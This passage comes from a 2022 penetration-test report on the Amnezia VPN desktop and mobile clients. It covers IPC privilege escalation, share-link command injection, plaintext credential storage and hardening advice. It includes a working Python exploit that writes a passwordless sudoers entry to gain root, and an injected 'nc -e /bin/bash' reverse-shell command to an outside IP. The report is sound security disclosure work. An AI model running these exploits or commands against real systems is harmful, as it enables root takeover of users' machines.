https://github.com/amnezia-vpn/desktop-client/pull/101\n38 https://www.frankindev.com/2020/11/26/permissions-for-.ssh-folder-and-key-files/\n7ASecurity © 2022\n17\n\n-- 17 of 37 --\n\nPentest Report\nSettings::VpnAllSites\nIpcClient::init succeed\nVpnLogic::onConnectionStateChanged \"Connecting...\"\nVpnConfigurator::getDnsForConfig \"1.1.1.1\" \"1.0.0.1\"\nSystemTrayNotificationHandler::setTrayState VpnProtocol::Connecting\nVpnConnection::createVpnConfiguration: using saved config for \"openvpn\"\nVpnConfigurator::getDnsForConfig \"1.1.1.1\" \"1.0.0.1\"\nSet config data /tmp/AmneziaVPN.DYXRpl\nOpenVpnProtocol::stop()\nCan't start TCP server, 8,The bound address is already in use\nVpnProtocol::setConnectionState \"Error\"\nConnection state: 'Error'\nVpnProtocol error, code ErrorCode::22(OpenVPN management server error) OpenVPN\nmanagement server error\nVpnLogic::onConnectionStateChanged \"Error\"\nSystemTrayNotificationHandler::setTrayState VpnProtocol::Error\nFig.: Failed OpenVPN setup (client UI)\n7ASecurity © 2022\n18\n\n-- 18 of 37 --\n\nPentest Report\nIt is recommended to replace the fixed port with a randomly chosen one. Additionally, the\napplication should detect when the port is already taken by another application and\nfallback to an alternative randomly generated port, if needed. Once a valid port is found,\nit should be forwarded to the Inter-Process Communication (IPC) socket.\nAVP-01-011 WP2: Linux/Mac/Win PrivEsc via IPC Design Flaw (Critical)\nRetest Notes: The Amnezia VPN Team resolved this issue40, and 7ASecurity verified\nthat the fix is valid.\nDuring the code review, it was found that the IPC implementation is vulnerable to\nprivilege escalation by design. The reason for this is that it instantiates the VPN process\nusing the commands supplied for execution by the client, which will be run with root\nprivileges inside the PrivilegedProcess class. The vulnerable workflow can be triggered\nvia IPC sockets, which are read and write accessible by any user, where the client\npasses the VPN command (e.g. /usr/sbin/openvpn), along with arguments (e.g. --config\n/tmp/AmneziaVPN.CxTOjh --management 127.0.0.1 57775 --management-client), to the\nprivileged service.\nIt should be noted that the Windows platform is affected too, as the vulnerability occurs\nwithin the program workflow. This vulnerability was confirmed on the Linux and Mac\nplatforms with the following proof-of-concept (PoC) code, where a replay attack is used\nto pass the location of a custom privilege escalation script instead of the regular\nopenvpn command line:\nPoC:\n#!/usr/bin/env python3\nimport binascii\nimport glob\nimport os\nimport socket\nimport sys\nimport time\nPHASE_A_ADDRESS = \"/tmp/local:AmneziaVpnIpcInterface\"\nPHASE_A_PAYLOADS =\n(\"0000001f0004000000180049007000630049006e007400650072006600610063006500\",\n\"000000320006000000180049007000630049006e0074006500720066006100630065000000000000000700\n00000000000001ffffffff\",\n\"000000320006000000180049007000630049006e0074006500720066006100630065000000000000000600\n00000000000002ffffffff\",\n40 https://github.com/amnezia-vpn/desktop-client/pull/94\n7ASecurity © 2022\n19\n\n-- 19 of 37 --\n\nPentest Report\n\"000000320006000000180049007000630049006e0074006500720066006100630065000000000000000000\n00000000000003ffffffff\")\nBUFFER_SIZE = 1024\nDEBUG = False\nsock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\ntry:\nsock.connect(PHASE_A_ADDRESS)\nexcept ConnectionRefusedError:\nexit(\"[x] AmneziaVPN-service does not seem to be running!\")\nfor payload in PHASE_A_PAYLOADS:\nsock.send(binascii.unhexlify(payload))\n_ = sock.recv(BUFFER_SIZE)\nif DEBUG:\nprint(_)\ntime.sleep(1)\nPHASE_B_ADDRESS = max(glob.glob(\"%s_*\" % PHASE_A_ADDRESS), key=os.path.getctime)\nPHASE_B_PAYLOADS =\n(\"0000002d00040000002600490070006300500072006f00630065007300730049006e00740065007200660\n0610063006500\",\n\"0000006b00060000002600490070006300500072006f00630065007300730049006e007400650072006600\n61006300650000000000000007000000010000000a0000000022002f0074006d0070002f007300750064006\nf005f0070006c0069007a002e00730068ffffffffffffffff000000f7000600000026004900700063005000\n72006f00630065007300730049006e007400650072006600610063006500000000000000030000000100000\n00b000000000600000010002d002d0063006f006e0066006900670000002c002f0074006d0070002f004100\n6d006e0065007a0069006100560050004e002e004300780054004f006a006800000018002d002d006d00610\n06e006100670065006d0065006e007400000012003100320037002e0030002e0030002e00310000000a0035\n003700370037003500000026002d002d006d0061006e006100670065006d0065006e0074002d0063006c006\n90065006e0074ffffffffffffffff0000004000060000002600490070006300500072006f00630065007300\n730049006e0074006500720066006100630065000000000000000100000000ffffffffffffffff\")\nPAYLOAD_CONTENT = (\"\"\"\n#!/bin/bash\necho \"%s ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers\n\"\"\" % os.getlogin()).strip() # NOTE: passwordless sudo to the current user\nPAYLOAD_LOCATION = \"/tmp/sudo_pliz.sh\" # NOTE: used in PHASE_B_PAYLOADS[1]\nopen(PAYLOAD_LOCATION, \"w+\").write(PAYLOAD_CONTENT)\nos.chmod(PAYLOAD_LOCATION, 0o744)\nif DEBUG:\nprint(PHASE_B_ADDRESS)\n7ASecurity © 2022\n20\n\n-- 20 of 37 --\n\nPentest Report\nsock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\nsock.connect(PHASE_B_ADDRESS)\n_ = sock.recv(BUFFER_SIZE)\nif DEBUG:\nprint(_)\nfor payload in PHASE_B_PAYLOADS:\nsock.send(binascii.unhexlify(payload))\n_ = sock.recv(BUFFER_SIZE)\nif DEBUG:\nprint(_)\nos.system(\"sudo $SHELL\")\nOutput (Exploitation PoC):\n$ whoami\nstamparm\n$ python3 exploit.py\n# whoami\nroot\nAffected Files:\nclient/protocols/openvpnprotocol.cpp\nclient/protocols/wireguardprotocol.cpp\nclient/protocols/ikev2_vpn_protocol_windows.cpp\nExample Affected Code:\nErrorCode OpenVpnProtocol::start()\n{\n[...]\nm_openVpnProcess = IpcClient::CreatePrivilegedProcess();\n[...]\nm_openVpnProcess->setProgram(openVpnExecPath());\nQStringList arguments({\"--config\" , configPath(), \"--management\",\nm_managementHost, QString::number(m_managementPort), \"--management-client\"/*,\n\"--log\", vpnLogFileNamePath */});\nm_openVpnProcess->setArguments(arguments);\n[...]\nm_openVpnProcess->start();\nIt is recommended to avoid passing the VPN program command line arguments from\npotentially malicious clients to the privileged service. Instead, the workflow should be\n7ASecurity © 2022\n21\n\n-- 21 of 37 --\n\nPentest Report\nmodified to only pass the necessary information, such as the configuration file path,\nwhile the command line creation is performed within the privileged service itself, after\nsanitizing user input to avoid other potential command execution vulnerabilities. Given\nboth the client and the server components of the VPN are on the same host, command\nline creation should be performed and validated on the privileged server component,\ninstead of the client application.\nAVP-01-014 WP2: Linux/Mac/Win RCE as root via Malicious Share Link (Critical)\nRetest Notes: The Amnezia VPN Team resolved this issue41, and 7ASecurity verified\nthat the fix is valid.\nIt was found that the share link feature of the Amnezia VPN desktop clients is prone to\nabuse. Please note that the Linux, Mac OS X, and Windows clients are affected by this\nissue as they all process these links in the same way. A malicious attacker, able to entice\na victim to open a malicious share link (i.e. vpn://…), could leverage this weakness to\ngain Remote Code Execution (RCE) with root privileges on a victim device. Additionally,\nthe current Share Server workflow does not allow the user to review the contents of the\nprovided link. Even advanced users base64-decoding the body will only get unreadable\ntext, as the content is compressed with the QCompress42 QT function. This was\nconfirmed on the Linux AmneziaVPN client as follows:\nIn the following payload, a crafted tls-verify directive was injected into the shared\nOpenVPN configuration, where the command “/usr/bin/nc -e /bin/bash 23.254.203.53\n4444” is run during connection establishment.\nPoC Payload:\nvpn://AAAkfHjanVp5r6NIkv[...]\nThe full payload is available on this link:\nFull PoC Payload:\nhttps://7as.es/AmneziaVPN_uEuw9k6N/vpn_share_link_poc.txt\nWhen the VPN client imports this link and a connection attempt is made, the payload is\nexecuted. Please note that more common directives, such as up and down were not\nused, because AmneziaVPN automatically overwrites those during the configuration\ninstantiation. The attacker receives a reverse root shell from the victim:\n42 https://doc.qt.io/qt-6/qbytearray.html#qCompress\n41 https://github.com/amnezia-vpn/desktop-client/pull/100\n7ASecurity © 2022\n22\n\n-- 22 of 37 --\n\nPentest Report\nCommand:\n$ nc -n -vv -l -p 4444\nOutput:\nlistening on [any] 4444 ...\nconnect to [23.254.203.53] from (UNKNOWN) [109.227.28.102] 55588\nwhoami\nroot\nThe root cause for this issue can be found in the following code path. The VPN client\nbase64-decodes the vpn:// link contents, then uncompresses the payload using the\nqUncompress function, and finally imports the user-supplied configuration without prior\nsanitization:\nAffected File:\nclient/ui/pages_logic/StartPageLogic.cpp\nAffected Code:\nbool StartPageLogic::importConnectionFromCode(QString code)\n{\ncode.replace(\"vpn://\", \"\");\nQByteArray ba = QByteArray::fromBase64(code.toUtf8(),\nQByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals);\nQByteArray ba_uncompressed = qUncompress(ba);\nif (!ba_uncompressed.isEmpty()) {\nba = ba_uncompressed;\n}\nQJsonObject o;\no = QJsonDocument::fromJson(ba).object();\nif (!o.isEmpty()) {\nreturn importConnection(o);\n}\n[...]\n}\n[...]\nbool StartPageLogic::importConnection(const QJsonObject &profile)\n{\nServerCredentials credentials;\ncredentials.hostName = profile.value(config_key::hostName).toString();\n7ASecurity © 2022\n23\n\n-- 23 of 37 --\n\nPentest Report\ncredentials.port = profile.value(config_key::port).toInt();\ncredentials.userName = profile.value(config_key::userName).toString();\ncredentials.password = profile.value(config_key::password).toString();\nif (credentials.isValid() || profile.contains(config_key::containers)) {\nm_settings.addServer(profile);\nm_settings.setDefaultServer(m_settings.serversCount() - 1);\nemit uiLogic()->goToPage(Page::Vpn);\nemit uiLogic()->setStartPage(Page::Vpn);\n}\n[...]\n}\nIn order to mitigate this issue, it is recommended to filter the parsed Shared Server\nconfiguration prior to inclusion into the local settings. Validation should be based on the\nwhitelisting principle, where only the settings of interest should be taken from it, and\nvalues ought to be checked for expected formats. In such a way, anything potentially\nmalicious would be just ignored. In addition to this, users should be presented with the\ndecoded values and asked whether they accept their inclusion.\nAVP-01-015 WP1: Config Access via missing iOS KeyChain usage (Medium)\nRetest Notes: The Amnezia VPN Team resolved this issue4344, and 7ASecurity verified\nthat the fix is valid.\nIt was found that the iOS app fails to make use of the iOS KeyChain. This\nhardware-backed security enclave is the most secure location to store app secrets in\niOS devices. A malicious attacker with access to iOS memory, filesystem, or backups\n(AVP-01-004) could steal VPN credentials and, in a worst case scenario, gain root\naccess to the Amnezia VPN server. To confirm this issue, the app keychain usage was\nreviewed. However, it was discovered that the application does not take advantage of\nthis platform security mechanism at present. It was later found that the application stores\ncredentials in clear-text files instead:\nAffected File:\n/var/mobile/Containers/Data/Application/[...]/Library/Preferences/org.amneziavpn.Amnezi\naVPN.plist\nAffected Contents:\n44 https://github.com/amnezia-vpn/desktop-client/pull/99\n43 https://github.com/amnezia-vpn/desktop-client/pull/97\n7ASecurity © 2022\n24\n\n-- 24 of 37 --\n\nPentest Report\n{\n[...]\n\"defaultContainer\": \"amnezia-ipsec\",\n\"description\": \"Server 1\",\n\"hostName\": \"5.45.92.15\",\n\"password\": \"4H[...]\",\n\"port\": 22,\n\"userName\": \"root\"\n}\n]\nIn order to solve this problem it is recommended to:\n1. Only store app secrets in the iOS KeyChain\n2. Avoid saving sensitive information such as credentials in plaintext files\n3. Restrict the level of access for each stored KeyChain item as much as possible\nFor keychain items that are not required by processes running in the background, it is\nrecommended to use a more restricted level of access. The best options for approaching\nthis are noted below, ordered by the protection level they provide (i.e. ideal option first):\nOption 1: AccessibleWhenPasscodeSetThisDeviceOnly45:\nThis is the absolute best option, it requires users to have a passcode set in the device\nand makes keychain items only available while the device is unlocked. Data will not be\nexported to backups and credentials will not be restored on another device when\nbackups are restored.\nIt has to be noted that this option can be further secured by requiring the user to\nauthenticate via Face or Touch ID prior to the application being able to access the\nrelevant keychain item46.\nOption 2: AccessibleWhenUnlockedThisDeviceOnly47:\nThis is the best option if the data should not be exported to backups. Credentials will not\nbe restored on another device when the backup is restored.\nOption 3: AccessibleWhenUnlocked48:\nThis is the best option if the data should be exported to backups. Credentials will be\nrestored on another device when the backup is restored.\n48 https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlocked\n47 https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlockedthisdeviceonly\n46 https://developer.apple.com/.../accessing_keychain_items_with_face_id_or_touch_id\n45 https://developer.apple.com/documentation/security/ksecattraccessiblewhenpasscodesetthisdeviceonly\n7ASecurity © 2022\n25\n\n-- 25 of 37 --\n\nPentest Report\nPlease note that, for keychain items that require to be accessible while the device is\nlocked, the AccessibleAfterFirstUnlockThisDeviceOnly49 Keychain level of access will at\nleast prevent potential leaks via iCloud or iTunes backups.\nAVP-01-016 WP1: Config Access via missing iOS Data Protection (Medium)\nRetest Notes: The Amnezia VPN Team resolved this issue5051, and 7ASecurity verified\nthat the fix is valid.\nIt was found that the iOS app does not currently implement the available Data Protection\nfeatures in iOS. This means that most files are encrypted with the default\nNSFileProtectionCompleteUntilFirstUserAuthentication52 encryption, which stores the\ndecryption key in memory while the device is locked. Moreover, this is the least secure\nform of data protection available on iOS. A malicious attacker with physical access to the\ndevice could leverage this weakness to read the decryption key from memory and gain\naccess to local app data files, without needing to unlock the device. Further scrutiny\nrevealed that some of the unprotected files display VPN server credentials and\nconfiguration information.\nTo replicate this issue, a jailbroken phone was left at rest for a few minutes on the lock\nscreen, then all application files were retrieved for inspection of any potential data leak.\nA handful of examples revealed by the app files retrieved during device lock can be\nconsulted below:\nAffected File:\nLibrary/Preferences/org.amneziavpn.AmneziaVPN.plist\nAffected Contents:\n\\\\n777be7e5f963abf4160cff1ca014d448\\\\n45300ed5c61276a94c6e48fdc3741356\\\\nefb279ad9174c\n3976fb84fb862315b16\\\\n282c10629eccc9354f2abebe652e20a7\\\\n4f20223b4d3eacea5c38a82df3d5c\nd29\\\\ncce182409ea1befe90f14b05465fe810\\\\n-----END OpenVPN Static key\nV1-----\\\\n\\\\n</tls-auth>\\\\n\\\"\\n}\\n\"\n}\n}\n],\n\"defaultContainer\": \"amnezia-openvpn\",\n\"description\": \"Server 1\",\n\"hostName\": \"5.45.92.15\",\n52 https://developer.apple.com/.../nsfileprotectioncompleteuntilfirstuserauthentication\n51 https://github.com/amnezia-vpn/desktop-client/pull/99\n50 https://github.com/amnezia-vpn/desktop-client/pull/97\n49 https://developer.apple.com/documentation/security/ksecattraccessibleafterfirstunlockthisdeviceonly\n7ASecurity © 2022\n26\n\n-- 26 of 37 --\n\nPentest Report\n\"password\": \"4H[...]\",\n\"port\": 22,\n\"userName\": \"root\"\n}\n]\nThe extent of this issue is perhaps best illustrated by the output of the tar command,\nwhich is able to read most files after the phone has remained passive on the lock screen\nfor a few minutes. This clearly demonstrates that most files are currently unprotected at\nrest.\nCommands:\ntar cvfz files_locked.tar.gz * > unprotected_files.txt 2> protected_files.txt\nwc -l protected_files.txt\nwc -l unprotected_files.txt\nOutput:\n3 protected_files.txt\n84 unprotected_files.txt\nIt is recommended to add the Data Protection capability at the application level53. This\nwill ensure that application data files are protected at rest with the strongest form of\nencryption available on iOS: NSFileProtectionComplete54. Furthermore, in order to\nprotect the cached entries, it is possible to subclass NSURLCache with a custom\nsubclass that stores URL responses in a custom SQLite database with file protection set\nto NSFileProtectionComplete55. Alternatively, before the request is sent, caching could\nbe disabled with a code snippet similar to the one shown below.\nProposed fix (to be used before a request is sent):\nconfiguration.requestCachePolicy = .reloadIgnoringCacheData\nAn alternative mitigatory action could be to clear all cached responses after the response\nis received.\nProposed fix (for after the response is received):\nURLCache.shared.removeAllCachedResponses()\nIn addition to the above, SQL Cipher56 could be considered to encrypt SQLite databases\n56 https://www.zetetic.net/sqlcipher/ios-tutorial/\n55 https://stackoverflow.com/questions/27933387/nsurlcache-and-data-protection\n54 https://developer.apple.com/documentation/foundation/nsfileprotectioncomplete\n53 https://developer.apple.com/documentation/.../com_apple_developer_default-data-protection\n7ASecurity © 2022\n27\n\n-- 27 of 37 --\n\nPentest Report\nat rest. The encryption key should be stored in the iOS keychain while data remains\nprotected. For additional mitigation guidance, please see the blog post titled “Best\npractices to avoid security vulnerabilities in your iOS app”57.\nHardening Recommendations\nThis area of the report provides insight into less significant weaknesses that might assist\nadversaries in certain situations. Issues listed in this section often require another\nvulnerability to be exploited, need an uncommon level of access, exhibit minor risk\npotential on their own, and/or fail to follow information security best practices.\nNevertheless, it is recommended to resolve as many of these items as possible to\nimprove the overall security posture and protect users in edge-case scenarios.\nAVP-01-007 WP1: Android Application Hardening Recommendations (Low)\nIt was found that the Android app fails to explicitly set a number of security configuration\nsettings. This unnecessarily weakens the overall security posture of the application due\nto suboptimal security defaults in a number of supported devices. For example, the\napplication will not block clear-text HTTP communications in certain Android versions.\nThese weaknesses are documented in more detail next.\nIssue 1: Undefined android:usesCleartextTraffic / cleartextTrafficPermitted\nThe application fails to define the android:usesCleartextTraffic attribute in both the\nAndroidManifest.xml file as well as cleartextTrafficPermitted on the\nnetwork_security_config.xml file. Android devices running Android 8.1 or lower (API <=\n27) will default to true, hence increasing the likelihood of the application having clear-text\nHTTP leaks.\nIt is recommended to explicitly set the android:usesCleartextTraffic attribute to false in\nthe AndroidManifest.xml file. If needed, specific exceptions could be declared inside the\nNetwork Security Configuration (network_security_config.xml). When the\nandroid:usesCleartextTraffic attribute is explicitly set to false, platform components (i.e.\nHTTP and FTP stacks, DownloadManager, and MediaPlayer) will refuse app requests to\nuse clear-text traffic. Third-party libraries should honor this setting as well. The key\nreason for avoiding clear-text traffic is the lack of confidentiality, authenticity, and\nprotections against tampering when a network attacker can eavesdrop on transmitted\ndata and modify it without being detected.\n57 http://blogs.quovantis.com/best-practices-to-avoid-security-vulnerabilities-in-your-ios-app/\n7ASecurity © 2022\n28\n\n-- 28 of 37 --\n\nPentest Report\nIssue 2: Undefined android:hasFragileUserData\nSince Android 10, it is possible to specify whether application data should survive when\napps are uninstalled with the attribute android:hasFragileUserData. When set to true, the\nuser will be prompted to keep the app information despite uninstallation.\nFig.: Uninstall prompt with check box for keeping the app data\nSince the default value is false, there is no security risk in failing to set this attribute.\nHowever, it is still recommended to explicitly set this setting to false to define the\nintention of the app to protect user information and ensure all data is deleted when the\napp is uninstalled. It should be noted that this option is only usable if the user tries to\nuninstall the app from the native settings. Otherwise, if the user uninstalls the app from\nGoogle Play, there will be no prompt asking whether data should be preserved or not.\nAVP-01-008 WP1: Missing Android root & iOS Jailbreak Detection (Info)\nIt was found that the Android and iOS apps do not currently implement any form of root\nor Jailbreak detection features at the time of writing. Hence, the application fails to alert\nusers about the security implications of running the app in such an environment. This\nissue can be confirmed by installing the application on a rooted device and validating the\ncomplete lack of application warnings.\nIt is recommended to implement a root detection solution to address this problem.\nPlease note that, since the user has root access and the application does not, the\napplication is always at a disadvantage. Mechanisms like these should always be\nconsidered bypassable when enough dedication and skill characterize the attacker.\nSome freely available libraries for iOS are IOSSecuritySuite58 and\n58 https://cocoapods.org/pods/IOSSecuritySuite\n7ASecurity © 2022\n29\n\n-- 29 of 37 --\n\nPentest Report\nDTTJailbreakDetection59, although custom checks are also possible in Swift\napplications60. Such solutions should be considered bypassable but sufficient to warn\nusers about the dangers of running the application on a jailbroken device. For best\nresults, it is recommended to test some commercial and open source6162 solutions\nagainst well-known Cydia tweaks like LibertyLite63, Shadow64, tsProtector 8+65 or\nA-Bypass66. Based on this, the development team could determine the most solid\napproach.\nThe freely available rootbeer library67 for Android could be considered for the purpose of\nalerting users on rooted devices, while bypassable, this would be sufficient for alerting\nusers of the dangers of running the app on rooted devices.\nAVP-01-009 WP1: Android Binary Hardening Recommendations (Info)\nIt was found that a number of binaries embedded into the Android application are\ncurrently not leveraging the available compiler flags to mitigate potential memory\ncorruption vulnerabilities. This unnecessarily puts the application more at risk for such\nissues.\nIssue 1: Binaries missing usage of -D_FORTIFY_SOURCE=2\nMissing this flag means common libc functions are missing buffer overflow checks, so\nthe application is more prone to memory corruption vulnerabilities. Please note that most\nbinaries are affected, the following is a reduced list of examples for the sake of brevity.\nExample binaries (from decompiled app):\nlib/arm64-v8a/libQt5Gamepad_arm64-v8a.so\nlib/arm64-v8a/libqml_QtQml_StateMachine_qtqmlstatemachine_arm64-v8a.so\nlib/arm64-v8a/libQt5MultimediaQuick_arm64-v8a.so\nlib/arm64-v8a/libQt5Multimedia_arm64-v8a.so\nlib/arm64-v8a/libQt5QuickParticles_arm64-v8a.so\nlib/arm64-v8a/libqml_QtQuick_Templates.2_qtquicktemplates2plugin_arm64-v8a.so\n67 https://github.com/scottyab/rootbeer\n66 https://repo.rpgfarm.com/\n65 http://apt.thebigboss.org/repofiles/cydia/\n64 https://ios.jjolano.me/\n63 http://ryleyangus.com/repo/\n62 https://github.com/securing/IOSSecuritySuite\n61 https://github.com/thii/DTTJailbreakDetection\n60 https://sabatsachin.medium.com/detect-jailbreak-device-in-swift-5-ios-programatically-da467028242d\n59 https://github.com/thii/DTTJailbreakDetection\n7ASecurity © 2022\n30\n\n-- 30 of 37 --\n\nPentest Report\nlib/arm64-v8a/libplugins_iconengines_qsvgicon_arm64-v8a.so\nlib/arm64-v8a/libqml_QtQuick_LocalStorage_qmllocalstorageplugin_arm64-v8a.so\nlib/arm64-v8a/libQt5QuickTemplates2_arm64-v8a.so\nIssue 2: Binaries missing usage of Stack Canary\nSome binaries do not have a stack canary value added to the stack. Stack canaries are\nused to detect and prevent exploits from overwriting return addresses.\nExample binaries (from decompiled app):\nlib/arm64-v8a/libovpnexec.so\nlib/arm64-v8a/libqml_QtQml_WorkerScript.2_workerscriptplugin_arm64-v8a.so\nlib/arm64-v8a/libqml_QtQuick_Shapes_qmlshapesplugin_arm64-v8a.so\nIt is recommended to compile all binaries using the -D_FORTIFY_SOURCE=2 argument\nso that common insecure glibc functions like memcpy, etc. are automatically protected\nwith buffer overflow checks.\nRegarding stack canaries, the option -fstack-protector-all can be used to allow the\ndetection of overflows by verifying the integrity of the canary before function returns.\nAVP-01-012 WP1/2: Possible Theft of Credentials via Plaintext Storage (Low)\nRetest Notes: The Amnezia VPN Team resolved this issue6869, and 7ASecurity verified\nthat the fix is valid.\nIt was found that all VPN clients currently store the VPN server credentials in plain text\nfiles. These credentials are later used to login to the server via SSH. A malicious\nattacker, with access to the filesystem, could leverage this weakness to retrieve the\nserver credentials and therefore gain unauthorized access to the VPN server. Please\nnote that all clients are affected by this issue, for the sake of brevity only a Mac OS X\nexample is shown in this ticket. However, the fact that credentials are stored in clear-text\nis part of the reason why other vulnerabilities are present in this report, i.e. Android\n(AVP-01-004, AVP-01-005), Linux (AVP-01-006). Windows is also affected. The following\nis an example from Mac OS X:\nCommand:\ncat /Users/tarun/Library/Preferences/org.amneziavpn.AmneziaVPN.plist\n69 https://github.com/amnezia-vpn/desktop-client/pull/99\n68 https://github.com/amnezia-vpn/desktop-client/pull/97\n7ASecurity © 2022\n31\n\n-- 31 of 37 --\n\nPentest Report\nOutput:\n[...]\n\"defaultContainer\": \"amnezia-shadowsocks\",\n\"description\": \"Server 2\",\n\"hostName\": \"5.45.92.15\",\n\"password\": \"4H[...]\",\n\"port\": 22,\n\"userName\": \"root\"\n}\n[...]\nIt is recommended to leverage the appropriate security enclave for the platform in order\nto store credentials securely. This can be summarized as follows:\n● In general, all platforms support SQLCipher70, to encrypt SQLite databases at\nrest\n● The Android client should leverage the Android Encrypted Preferences71 or the\nAndroid Keystore72.\n● The Mac OS and iOS clients should leverage the KeyChain API73 to safely store\napp secrets.\n● The Windows client should leverage the Windows Credential Manager74 and the\nData Protection API75, both of which can be used programmatically76.\n● Unfortunately Linux does not have a standard Credential Manager, Data\nProtection API (Windows), or Keychain (Mac) that can be used programmatically.\nHowever, the OWASP Cryptographic Storage Cheat Sheet provides some\nguidance that may be of value77.\nIn situations where the proposed mitigation above is unfeasible, another option to protect\ncredentials at rest could be to require users to type a passphrase to decrypt\nconfiguration files, in a similar fashion to how it is done to protect PGP or SSH keys.\n77 https://owasp.org/www-project-cheat-sheets/cheatsheets/Cryptographic_Storage_Cheat_Sheet\n76 https://www.meziantou.net/how-to-store-a-password-on-windows.htm\n75 https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection\n74 https://pureinfotech.com/credential-manager-windows-10/\n73 https://developer.apple.com/.../.../keys/storing_keys_in_the_keychain\n72 https://developer.android.com/training/articles/keystore\n71 https://developer.android.com/topic/security/data\n70 https://www.zetetic.net/sqlcipher/\n7ASecurity © 2022\n32\n\n-- 32 of 37 --\n\nPentest Report\nAVP-01-013 WP2: Possible Weaknesses via Insecure Function Usage (Low)\nDuring the code review, a number of insecure coding practices was identified. For\nexample, multiple snippets of source code using potentially unsafe functions (e.g. strlen,\nread, memcpy, open, sprintf, etc.) were reviewed and verified to be absent of security\nvulnerabilities. Additionally, usage of some explicitly banned insecure functions78, such\nas strcpy, was identified. Those functions are known to facilitate the presence of memory\ncorruption vulnerabilities79, and should be avoided completely. Please note the following\nare just some examples, for the sake of brevity:\nExample 1: Potentially unsafe usage of strcpy\nAffected File:\nservice/server/router_mac.cpp\nAffected Code:\nint argc = parts.size();\nchar **argv = new char*[argc];\nfor (int i = 0; i < argc; i++) {\nargv[i] = new char[parts.at(i).toStdString().length() + 1];\nstrcpy(argv[i], parts.at(i).toStdString().c_str());\n}\nExample 2: Potentially unsafe usage of strncpy\nAffected File:\nclient/platforms/macos/daemon/iputilsmacos.cpp\nAffected Code:\nbool IPUtilsMacos::addIP4AddressToDevice(const InterfaceConfig& config) {\nQ_UNUSED(config);\nQString ifname = MacOSDaemon::instance()->m_wgutils->interfaceName();\nstruct ifaliasreq ifr;\nstruct sockaddr_in* ifrAddr = (struct sockaddr_in*)&ifr.ifra_addr;\nstruct sockaddr_in* ifrMask = (struct sockaddr_in*)&ifr.ifra_mask;\nstruct sockaddr_in* ifrBcast = (struct sockaddr_in*)&ifr.ifra_broadaddr;\n// Name the interface and set family\n79 https://github.com/git/git/blob/master/banned.h\n78 https://github.com/jwasham/c-note/blob/master/safety.md\n7ASecurity © 2022\n33\n\n-- 33 of 37 --\n\nPentest Report\nmemset(&ifr, 0, sizeof(ifr));\nstrncpy(ifr.ifra_name, qPrintable(ifname), IFNAMSIZ);\nIt is recommended to avoid the usage of insecure C functions, as much as possible,\nthroughout the codebase to eliminate or reduce the potential for memory corruption\nvulnerabilities. For instance, strcpy lacks checks for buffer overflows when copying to a\ndestination, while strncpy is easily used incorrectly and does not always zero-terminate\nor check for invalid pointers. Thus, usage of safer alternatives, such as strcpy_s80 and\nstrncpy_s81, introduced in C11, is recommended instead.\n81 https://en.cppreference.com/w/c/string/byte/strncpy\n80 https://en.cppreference.com/w/c/string/byte/strcpy\n7ASecurity © 2022\n34\n\n-- 34 of 37 --\n\nPentest Report\nConclusion\nThe Amnezia VPN client applications defended themselves well against a broad range\nof attack vectors. However, being a first penetration test for this solution, a number of\nsignificant security flaws could be identified this time. Future engagements will confirm\nthat regular penetration testing is a valuable process that accomplishes two major goals:\nA decrease in the number of vulnerabilities found over time and an increase in the effort\nto identify security issues. This combination raises the bar for prospective attackers and\nplaces the platform in a much better position.\nThe Amnezia VPN clients provided a number of positive impressions during this\nassignment that must be mentioned here:\n● In general, the platform employs a modular VPN deployment on a remote server\nbased on Docker containers, which looks promising and well implemented.\n● The user interface is intuitive and easy to use.\n● The source code of the applications is well written, easy to read, and generally\nadheres to a number of security best practices.\n● The Android and iOS mobile applications offer little attack surface, hence\nreducing the potential for security vulnerabilities.\n● The mobile applications were not found to leak sensitive data in log files, or\ninsecure locations like the Android SD Card. Furthermore, secure platform\ndefaults such as ATS are not weakened, which eliminates the potential for\nclear-text HTTP leaks.\n● Additionally, the Android app only supports devices running at least Android 7,\nand avoids signing the APK using insecure v1 signatures, which avoids attacks\nvia the Janus vulnerability82.\n● Similarly, the iOS app does not implement any custom URL schemes, which\nprevents well-known URL hijacking attacks83.\nThe security of the Amnezia VPN Desktop applications will improve substantially with a\nfocus on the following areas:\n● File Permissions: Some concerning findings during this exercise had to do with\nmalicious local users being able to gain root privileges (AVP-01-001) as well as\nstealing VPN server credentials (AVP-01-006). This was due to insecure file\npermissions. Please note that the presence of this security anti-pattern was found\nin many more locations. Therefore it is strongly recommended to review all files\nthoroughly to ensure they follow the principle of least privilege84 and implement\n84 https://en.wikipedia.org/wiki/Principle_of_least_privilege\n83 https://malware.news/t/ios-url-scheme-susceptible-to-hijacking/31266\n82 https://www.xda-developers.com/janus-vulnerability-android-apps/\n7ASecurity © 2022\n35\n\n-- 35 of 37 --\n\nPentest Report\nthe minimum possible permissions for the applications to work. This will\ncompletely eliminate this attack vector in the future.\n● Input Validation: User-supplied VPN configuration settings, whether from VPN\nURLs or individual fields, must be validated as strictly as possible to avoid local\nprivilege escalation vulnerabilities (AVP-01-014).\n● Security Architecture: The current approach for communication between the\nVPN clients and the local VPN service using IPC must be redesigned. In\nparticular, passing VPN program arguments from the client to a privileged VPN\nservice fails to take into account the scenario of a malicious user and should be\navoided (AVP-01-011).\n● Protection of Credentials at Rest: The Amnezia VPN clients should avoid\nstoring credentials in plaintext, and instead leverage the security enclaves and\ndata protection APIs for each client platform (AVP-01-012).\n● Removal of Unsafe Functions: The Amnezia VPN codebase should eliminate\nfunctions with known security weaknesses, as much as possible. The\ndevelopment team should instead leverage safe functions for adequate\nprotection against memory corruption vulnerabilities, as well as management of\nsecurity of tokens, hashes, passwords and any other application areas\n(AVP-01-013, AVP-01-012)\nThe security of the Amnezia VPN Mobile applications will improve substantially with a\nfocus on the following areas:\n● Hardware-backed Security Enclave Usage: The Android and iOS applications\nshould leverage the hardware-backed security enclave available in the platform,\nrespectively the Android Keystore and the iOS Keychain for best protection of\nsecrets at rest (AVP-01-005, AVP-01-015).\n● Filesystem Protection: The iOS app should leverage the available Data\nProtection features to protect data at rest with the strongest form of iOS\nencryption (AVP-01-016). However, generally speaking, both apps should avoid\nstoring sensitive data without encryption in the filesystem (AVP-01-012), as this\ncan result in leaks via backups 